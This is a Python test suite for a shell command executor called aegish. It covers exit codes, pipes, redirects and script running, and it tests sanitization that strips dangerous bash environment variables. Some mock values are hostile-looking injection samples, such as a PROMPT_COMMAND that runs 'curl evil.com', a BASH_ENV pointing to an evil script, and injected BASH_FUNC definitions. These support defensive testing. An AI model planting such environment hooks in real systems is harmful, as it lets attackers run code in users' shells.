"""Tests for command execution."""

import os

from aegish.executor import (
    DANGEROUS_ENV_VARS,
    _build_safe_env,
    execute_command,
    run_bash_command,
)


def test_execute_command_exit_code_success():
    """Test that successful commands return 0."""
    exit_code = execute_command("true")
    assert exit_code == 0


def test_execute_command_exit_code_failure():
    """Test that failed commands return non-zero."""
    exit_code = execute_command("false")
    assert exit_code == 1


def test_execute_command_specific_exit_code():
    """Test that specific exit codes are preserved."""
    exit_code = execute_command("exit 42")
    assert exit_code == 42


def test_run_bash_command_captures_stdout():
    """Test that run_bash_command captures stdout."""
    result = run_bash_command("echo hello")
    assert result.stdout.strip() == "hello"
    assert result.returncode == 0


def test_run_bash_command_captures_stderr():
    """Test that run_bash_command captures stderr."""
    result = run_bash_command("echo error >&2")
    assert result.stderr.strip() == "error"
    assert result.returncode == 0


def test_execute_command_with_pipe():
    """Test that pipes work correctly."""
    exit_code = execute_command("echo hello | grep hello")
    assert exit_code == 0


def test_execute_command_with_failed_pipe():
    """Test that failed pipe commands return non-zero."""
    exit_code = execute_command("echo hello | grep goodbye")
    assert exit_code == 1


def test_execute_command_last_exit_code():
    """Test that last_exit_code is available via $?."""
    result = run_bash_command("(exit 42); echo $?")
    assert result.stdout.strip() == "42"


def test_execute_command_preserves_last_exit():
    """Test that execute_command sets $? correctly."""
    # First run fails
    exit_code = execute_command("false")
    assert exit_code == 1

    # Check that $? is 1 in the next command
    result = run_bash_command("(exit 1); echo $?")
    assert result.stdout.strip() == "1"


# =============================================================================
# Story 1.3: Pipes, Redirects, and Command Chaining Tests
# =============================================================================


def test_pipe_command():
    """Test that piped commands work (AC1)."""
    result = run_bash_command("echo hello | tr 'h' 'H'")
    assert result.stdout.strip() == "Hello"
    assert result.returncode == 0


def test_multiple_pipes():
    """Test multiple pipes in sequence (AC1)."""
    result = run_bash_command('echo "c\na\nb" | sort | head -1')
    assert result.stdout.strip() == "a"


def test_pipe_with_grep():
    """Test pipe with grep (AC1)."""
    result = run_bash_command("echo -e 'foo.txt\nbar.log\nbaz.txt' | grep txt")
    assert "foo.txt" in result.stdout
    assert "baz.txt" in result.stdout
    assert "bar.log" not in result.stdout


def test_pipe_chain_cat_sort_uniq_head():
    """Test cat | sort | uniq | head chain (AC1)."""
    result = run_bash_command('echo -e "b\na\nb\nc\na" | sort | uniq | head -2')
    assert result.stdout.strip() == "a\nb"


def test_output_redirect(tmp_path):
    """Test output redirection > (AC2)."""
    test_file = tmp_path / "test.txt"
    result = run_bash_command(f'echo "content" > {test_file}')
    assert result.returncode == 0
    assert test_file.read_text().strip() == "content"


def test_append_redirect(tmp_path):
    """Test append redirection >> (AC2)."""
    test_file = tmp_path / "test.txt"
    test_file.write_text("line1\n")
    result = run_bash_command(f'echo "line2" >> {test_file}')
    assert result.returncode == 0
    assert test_file.read_text() == "line1\nline2\n"


def test_stderr_redirect(tmp_path):
    """Test stderr redirection 2> (AC2)."""
    error_file = tmp_path / "errors.txt"
    result = run_bash_command(f"ls /nonexistent_path_12345 2> {error_file}")
    assert result.returncode != 0
    error_content = error_file.read_text()
    assert "nonexistent" in error_content or "No such file" in error_content


def test_input_redirect(tmp_path):
    """Test input redirection < (AC3)."""
    input_file = tmp_path / "input.txt"
    input_file.write_text("cherry\napple\nbanana\n")
    result = run_bash_command(f"sort < {input_file}")
    assert result.stdout.strip() == "apple\nbanana\ncherry"


def test_chain_and_success():
    """Test && with successful first command (AC4)."""
    result = run_bash_command('true && echo "success"')
    assert result.stdout.strip() == "success"


def test_chain_and_failure():
    """Test && with failed first command - short-circuit (AC4)."""
    result = run_bash_command('false && echo "success"')
    assert result.stdout.strip() == ""


def test_chain_or_success():
    """Test || with successful first command - short-circuit (AC5)."""
    result = run_bash_command('true || echo "fallback"')
    assert result.stdout.strip() == ""


def test_chain_or_failure():
    """Test || with failed first command (AC5)."""
    result = run_bash_command('false || echo "fallback"')
    assert result.stdout.strip() == "fallback"


def test_sequential_semicolon():
    """Test ; for sequential execution (AC6)."""
    result = run_bash_command("echo a; echo b; echo c")
    assert result.stdout.strip() == "a\nb\nc"


def test_combined_pipe_and_chain():
    """Test combined operations (AC7)."""
    # ls | grep txt && echo "found" || echo "none"
    # When grep succeeds, "found" should print
    result = run_bash_command('echo "file.txt" | grep txt && echo "found" || echo "none"')
    assert "found" in result.stdout
    assert "none" not in result.stdout


def test_combined_pipe_and_chain_failure():
    """Test combined operations with failure (AC7)."""
    # When grep fails (no match), "none" should print
    result = run_bash_command('echo "file.log" | grep txt && echo "found" || echo "none"')
    assert "none" in result.stdout
    assert "found" not in result.stdout


def test_stderr_to_stdout_redirect():
    """Test 2>&1 redirection (edge case)."""
    result = run_bash_command("ls /nonexistent_path_12345 2>&1 | head -1")
    assert "nonexistent" in result.stdout or "No such file" in result.stdout


def test_combined_redirects(tmp_path):
    """Test combined input and output redirect."""
    input_file = tmp_path / "in.txt"
    output_file = tmp_path / "out.txt"
    input_file.write_text("3\n1\n2\n")
    result = run_bash_command(f"sort < {input_file} > {output_file}")
    assert result.returncode == 0
    assert output_file.read_text().strip() == "1\n2\n3"


# =============================================================================
# Story 1.4: Shell Script Execution Tests
# =============================================================================


def test_script_direct_execution(tmp_path):
    """Test ./script.sh execution (AC1)."""
    script = tmp_path / "test.sh"
    script.write_text("#!/bin/bash\necho 'hello from script'")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert result.stdout.strip() == "hello from script"
    assert result.returncode == 0


def test_script_bash_invocation(tmp_path):
    """Test bash script.sh execution (AC2)."""
    script = tmp_path / "test.sh"
    script.write_text("#!/bin/bash\necho 'bash invoked'")
    # No execute permission needed for bash script.sh
    result = run_bash_command(f"bash {script}")
    assert result.stdout.strip() == "bash invoked"


def test_script_with_arguments(tmp_path):
    """Test script receives arguments correctly (AC3)."""
    script = tmp_path / "args.sh"
    script.write_text('#!/bin/bash\necho "arg1=$1 arg2=$2"')
    script.chmod(0o755)
    result = run_bash_command(f"{script} hello world")
    assert result.stdout.strip() == "arg1=hello arg2=world"


def test_script_all_args(tmp_path):
    """Test $@ contains all arguments (AC3)."""
    script = tmp_path / "allargs.sh"
    script.write_text('#!/bin/bash\necho "$@"')
    script.chmod(0o755)
    result = run_bash_command(f"{script} a b c d")
    assert result.stdout.strip() == "a b c d"


def test_script_exit_code(tmp_path):
    """Test script exit code is preserved (AC5)."""
    script = tmp_path / "exitcode.sh"
    script.write_text("#!/bin/bash\nexit 42")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert result.returncode == 42


def test_script_exit_code_zero(tmp_path):
    """Test successful script returns 0 (AC5)."""
    script = tmp_path / "success.sh"
    script.write_text("#!/bin/bash\necho 'success'\nexit 0")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert result.returncode == 0


def test_script_env_shebang(tmp_path):
    """Test #!/usr/bin/env bash shebang (AC4)."""
    script = tmp_path / "envbash.sh"
    script.write_text("#!/usr/bin/env bash\necho 'env bash'")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert result.stdout.strip() == "env bash"


def test_script_sh_shebang(tmp_path):
    """Test #!/bin/sh shebang (AC4)."""
    script = tmp_path / "sh.sh"
    script.write_text("#!/bin/sh\necho 'posix sh'")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert result.stdout.strip() == "posix sh"


def test_script_with_spaces_in_path(tmp_path):
    """Test script in path with spaces (edge case)."""
    dir_with_spaces = tmp_path / "my scripts"
    dir_with_spaces.mkdir()
    script = dir_with_spaces / "test.sh"
    script.write_text("#!/bin/bash\necho 'spaces work'")
    script.chmod(0o755)
    # Must quote the path
    result = run_bash_command(f'"{script}"')
    assert result.stdout.strip() == "spaces work"


def test_script_with_stdin(tmp_path):
    """Test script that reads from stdin (edge case)."""
    script = tmp_path / "stdin.sh"
    script.write_text('#!/bin/bash\nread line\necho "got: $line"')
    script.chmod(0o755)
    result = run_bash_command(f'echo "input" | {script}')
    assert result.stdout.strip() == "got: input"


def test_script_sources_other_file(tmp_path):
    """Test script that sources another file (edge case)."""
    lib = tmp_path / "lib.sh"
    lib.write_text("MYVAR='from lib'")
    script = tmp_path / "main.sh"
    script.write_text(f'#!/bin/bash\nsource {lib}\necho $MYVAR')
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert result.stdout.strip() == "from lib"


def test_script_with_heredoc(tmp_path):
    """Test script with here-doc (edge case)."""
    script = tmp_path / "heredoc.sh"
    script.write_text('#!/bin/bash\ncat <<EOF\nline1\nline2\nEOF\n')
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    assert "line1" in result.stdout
    assert "line2" in result.stdout


# =============================================================================
# Story 1.5: Exit Code Preservation Tests
# =============================================================================


def test_exit_code_true_via_echo():
    """Test 'true' returns 0, verified via $? (AC1)."""
    result = run_bash_command("true; echo $?")
    assert result.stdout.strip() == "0"


def test_exit_code_false_via_echo():
    """Test 'false' returns 1, verified via $? (AC2)."""
    result = run_bash_command("false; echo $?")
    assert result.stdout.strip() == "1"


def test_exit_code_nonexistent_file():
    """Test ls on nonexistent file returns non-zero (AC2)."""
    result = run_bash_command("ls /nonexistent_file_12345 2>/dev/null")
    assert result.returncode != 0


def test_exit_code_range():
    """Test various exit codes in valid range are preserved (AC3)."""
    for code in [0, 1, 2, 127, 128, 255]:
        exit_code = execute_command(f"exit {code}")
        assert exit_code == code, f"Expected {code}, got {exit_code}"


def test_exit_code_pipeline_success():
    """Test pipeline returns 0 when last command succeeds (AC6)."""
    result = run_bash_command("echo hello | grep hello")
    assert result.returncode == 0


def test_exit_code_pipeline_failure():
    """Test pipeline returns non-zero when last command fails (AC6)."""
    result = run_bash_command("echo hello | grep goodbye")
    assert result.returncode == 1


def test_exit_code_script_set_e(tmp_path):
    """Test script with set -e exits on first failure (AC5)."""
    script = tmp_path / "set_e.sh"
    script.write_text("""#!/bin/bash
set -e
echo "before"
false
echo "after"
""")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    # Should print "before" but not "after" due to set -e
    assert "before" in result.stdout
    assert "after" not in result.stdout
    assert result.returncode != 0


def test_exit_code_script_no_set_e(tmp_path):
    """Test script without set -e continues after failure (AC5 control)."""
    script = tmp_path / "no_set_e.sh"
    script.write_text("""#!/bin/bash
echo "before"
false
echo "after"
""")
    script.chmod(0o755)
    result = run_bash_command(f"{script}")
    # Should print both because no set -e
    assert "before" in result.stdout
    assert "after" in result.stdout


def test_exit_code_complex_chain():
    """Test complex chain with multiple exit codes (AC6)."""
    # (fail && skip) || run -> should run fallback
    result = run_bash_command('false && echo "A" || echo "B"')
    assert result.stdout.strip() == "B"

    # (success && run) || skip -> should run first, skip fallback
    result = run_bash_command('true && echo "A" || echo "B"')
    assert result.stdout.strip() == "A"


def test_exit_code_subshell():
    """Test exit code from subshell is preserved (AC3)."""
    result = run_bash_command("(exit 99); echo $?")
    assert result.stdout.strip() == "99"


def test_exit_code_command_not_found():
    """Test command not found returns 127 (AC2)."""
    result = run_bash_command("nonexistent_command_xyz123 2>/dev/null")
    assert result.returncode == 127


# =============================================================================
# Story 6.2: Environment Sanitization Tests
# =============================================================================


class TestBuildSafeEnv:
    """Tests for _build_safe_env() environment sanitization (AC1, AC2, AC3)."""

    # --- Edge case: empty environment ---

    def test_empty_environment_returns_empty_dict(self, mocker):
        """Edge case: empty os.environ returns empty dict."""
        mocker.patch.dict(os.environ, {}, clear=True)
        env = _build_safe_env()
        assert env == {}

    # --- Task 1.1: Each DANGEROUS_ENV_VARS member is stripped individually ---

    def test_bash_env_stripped(self, mocker):
        """AC1: BASH_ENV is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "BASH_ENV": "/tmp/hook.sh"}, clear=True)
        env = _build_safe_env()
        assert "BASH_ENV" not in env
        assert env["PATH"] == "/usr/bin"

    def test_env_stripped(self, mocker):
        """AC1: ENV is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "ENV": "/tmp/hook.sh"}, clear=True)
        env = _build_safe_env()
        assert "ENV" not in env

    def test_prompt_command_stripped(self, mocker):
        """AC1: PROMPT_COMMAND is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "PROMPT_COMMAND": "evil"}, clear=True)
        env = _build_safe_env()
        assert "PROMPT_COMMAND" not in env

    def test_editor_stripped(self, mocker):
        """AC1: EDITOR is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "EDITOR": "vim"}, clear=True)
        env = _build_safe_env()
        assert "EDITOR" not in env

    def test_visual_stripped(self, mocker):
        """AC1: VISUAL is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "VISUAL": "vim"}, clear=True)
        env = _build_safe_env()
        assert "VISUAL" not in env

    def test_pager_stripped(self, mocker):
        """AC1: PAGER is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "PAGER": "less"}, clear=True)
        env = _build_safe_env()
        assert "PAGER" not in env

    def test_git_pager_stripped(self, mocker):
        """AC1: GIT_PAGER is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "GIT_PAGER": "less"}, clear=True)
        env = _build_safe_env()
        assert "GIT_PAGER" not in env

    def test_manpager_stripped(self, mocker):
        """AC1: MANPAGER is stripped from environment."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin", "MANPAGER": "less"}, clear=True)
        env = _build_safe_env()
        assert "MANPAGER" not in env

    def test_dangerous_env_vars_has_exactly_eight_entries(self):
        """Verify DANGEROUS_ENV_VARS constant has exactly 8 entries."""
        assert len(DANGEROUS_ENV_VARS) == 8
        assert DANGEROUS_ENV_VARS == {
            "BASH_ENV", "ENV", "PROMPT_COMMAND",
            "EDITOR", "VISUAL", "PAGER", "GIT_PAGER", "MANPAGER",
        }

    # --- Task 1.2: BASH_FUNC_* prefix variables stripped ---

    def test_bash_func_prefix_stripped(self, mocker):
        """AC2: BASH_FUNC_* variables are stripped."""
        mocker.patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "BASH_FUNC_myfunc%%": "() { echo pwned; }",
        }, clear=True)
        env = _build_safe_env()
        assert "BASH_FUNC_myfunc%%" not in env
        assert env["PATH"] == "/usr/bin"

    def test_multiple_bash_func_prefixes_stripped(self, mocker):
        """AC2: Multiple BASH_FUNC_* variables are all stripped."""
        mocker.patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "BASH_FUNC_foo%%": "() { echo foo; }",
            "BASH_FUNC_bar%%": "() { echo bar; }",
            "BASH_FUNC_baz%%": "() { echo baz; }",
        }, clear=True)
        env = _build_safe_env()
        bash_func_keys = [k for k in env if k.startswith("BASH_FUNC_")]
        assert bash_func_keys == []

    def test_bash_func_without_percent_suffix_stripped(self, mocker):
        """AC2: BASH_FUNC_ prefix without %% suffix is also stripped."""
        mocker.patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "BASH_FUNC_exploit": "malicious",
        }, clear=True)
        env = _build_safe_env()
        assert "BASH_FUNC_exploit" not in env
        assert env["PATH"] == "/usr/bin"

    # --- Task 1.3: PATH, HOME, USER preserved ---

    def test_path_preserved(self, mocker):
        """AC3: PATH is preserved."""
        mocker.patch.dict(os.environ, {"PATH": "/usr/bin:/usr/local/bin"}, clear=True)
        env = _build_safe_env()
        assert env["PATH"] == "/usr/bin:/usr/local/bin"

    def test_home_preserved(self, mocker):
        """AC3: HOME is preserved."""
        mocker.patch.dict(os.environ, {"HOME": "/home/user"}, clear=True)
        env = _build_safe_env()
        assert env["HOME"] == "/home/user"

    def test_user_preserved(self, mocker):
        """AC3: USER is preserved."""
        mocker.patch.dict(os.environ, {"USER": "testuser"}, clear=True)
        env = _build_safe_env()
        assert env["USER"] == "testuser"

    # --- Task 1.4: API keys preserved ---

    def test_openai_api_key_preserved(self, mocker):
        """AC3: OPENAI_API_KEY is preserved."""
        mocker.patch.dict(os.environ, {"OPENAI_API_KEY": "sk-test123"}, clear=True)
        env = _build_safe_env()
        assert env["OPENAI_API_KEY"] == "sk-test123"

    def test_anthropic_api_key_preserved(self, mocker):
        """AC3: ANTHROPIC_API_KEY is preserved."""
        mocker.patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-ant-test"}, clear=True)
        env = _build_safe_env()
        assert env["ANTHROPIC_API_KEY"] == "sk-ant-test"

    # --- Task 1.5: Custom user variables preserved ---

    def test_java_home_preserved(self, mocker):
        """AC3: Custom variable JAVA_HOME is preserved."""
        mocker.patch.dict(os.environ, {"JAVA_HOME": "/usr/lib/jvm/java-17"}, clear=True)
        env = _build_safe_env()
        assert env["JAVA_HOME"] == "/usr/lib/jvm/java-17"

    def test_gopath_preserved(self, mocker):
        """AC3: Custom variable GOPATH is preserved."""
        mocker.patch.dict(os.environ, {"GOPATH": "/home/user/go"}, clear=True)
        env = _build_safe_env()
        assert env["GOPATH"] == "/home/user/go"

    def test_node_env_preserved(self, mocker):
        """AC3: Custom variable NODE_ENV is preserved."""
        mocker.patch.dict(os.environ, {"NODE_ENV": "production"}, clear=True)
        env = _build_safe_env()
        assert env["NODE_ENV"] == "production"

    # --- Task 1.6: Combined scenario ---

    def test_combined_dangerous_and_safe_vars(self, mocker):
        """AC1+AC2+AC3: Only dangerous vars stripped, safe vars preserved in same env."""
        mocker.patch.dict(os.environ, {
            # Safe vars (5)
            "PATH": "/usr/bin",
            "HOME": "/home/user",
            "USER": "testuser",
            "OPENAI_API_KEY": "sk-test",
            "JAVA_HOME": "/usr/lib/jvm",
            # All 8 DANGEROUS_ENV_VARS
            "BASH_ENV": "/tmp/evil.sh",
            "ENV": "/tmp/evil.sh",
            "PROMPT_COMMAND": "curl evil.com",
            "EDITOR": "/tmp/evil",
            "VISUAL": "/tmp/evil",
            "PAGER": "/tmp/evil",
            "GIT_PAGER": "/tmp/evil",
            "MANPAGER": "/tmp/evil",
            # BASH_FUNC_ prefix
            "BASH_FUNC_exploit%%": "() { echo pwned; }",
        }, clear=True)
        env = _build_safe_env()

        # All 8 dangerous vars stripped
        for var in DANGEROUS_ENV_VARS:
            assert var not in env, f"{var} should be stripped"
        assert "BASH_FUNC_exploit%%" not in env

        # Safe vars preserved
        assert env["PATH"] == "/usr/bin"
        assert env["HOME"] == "/home/user"
        assert env["USER"] == "testuser"
        assert env["OPENAI_API_KEY"] == "sk-test"
        assert env["JAVA_HOME"] == "/usr/lib/jvm"
        assert len(env) == 5


class TestExecuteCommandHardening:
    """Tests for execute_command() subprocess hardening (AC4)."""

    # --- Task 2.1: --norc and --noprofile flags ---

    def test_execute_command_uses_norc_noprofile(self, mocker):
        """AC4: execute_command passes --norc and --noprofile to bash."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.MagicMock(returncode=0)

        execute_command("echo test")

        call_args = mock_run.call_args
        cmd_list = call_args[0][0]
        assert cmd_list[0] == "bash"
        assert "--norc" in cmd_list
        assert "--noprofile" in cmd_list
        assert "-c" in cmd_list

    # --- Task 2.2: env kwarg with sanitized dict ---

    def test_execute_command_passes_sanitized_env(self, mocker):
        """AC4: execute_command passes env kwarg with sanitized dict."""
        mocker.patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "BASH_ENV": "/tmp/evil.sh",
        }, clear=True)
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.MagicMock(returncode=0)

        execute_command("echo test")

        call_args = mock_run.call_args
        assert "env" in call_args.kwargs
        env_dict = call_args.kwargs["env"]
        assert isinstance(env_dict, dict)
        assert env_dict["PATH"] == "/usr/bin"

    # --- Task 2.3: env dict excludes BASH_ENV ---

    def test_execute_command_env_excludes_bash_env(self, mocker):
        """AC4: env dict passed to subprocess does NOT contain BASH_ENV."""
        mocker.patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "BASH_ENV": "/tmp/evil.sh",
        }, clear=True)
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.MagicMock(returncode=0)

        execute_command("echo test")

        env_dict = mock_run.call_args.kwargs["env"]
        assert "BASH_ENV" not in env_dict


class TestRunBashCommandHardening:
    """Tests for run_bash_command() subprocess hardening (AC5)."""

    # --- Task 3.1: --norc and --noprofile flags ---

    def test_run_bash_command_uses_norc_noprofile(self, mocker):
        """AC5: run_bash_command passes --norc and --noprofile to bash."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.MagicMock(
            returncode=0, stdout="", stderr=""
        )

        run_bash_command("echo test")

        call_args = mock_run.call_args
        cmd_list = call_args[0][0]
        assert cmd_list[0] == "bash"
        assert "--norc" in cmd_list
        assert "--noprofile" in cmd_list
        assert "-c" in cmd_list

    # --- Task 3.2: env kwarg with sanitized dict ---

    def test_run_bash_command_passes_sanitized_env(self, mocker):
        """AC5: run_bash_command passes env kwarg with sanitized dict."""
        mocker.patch.dict(os.environ, {
            "PATH": "/usr/bin",
            "BASH_ENV": "/tmp/evil.sh",
            "PROMPT_COMMAND": "evil",
        }, clear=True)
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.MagicMock(
            returncode=0, stdout="", stderr=""
        )

        run_bash_command("echo test")

        call_args = mock_run.call_args
        assert "env" in call_args.kwargs
        env_dict = call_args.kwargs["env"]
        assert isinstance(env_dict, dict)
        assert env_dict["PATH"] == "/usr/bin"
        assert "BASH_ENV" not in env_dict
        assert "PROMPT_COMMAND" not in env_dict
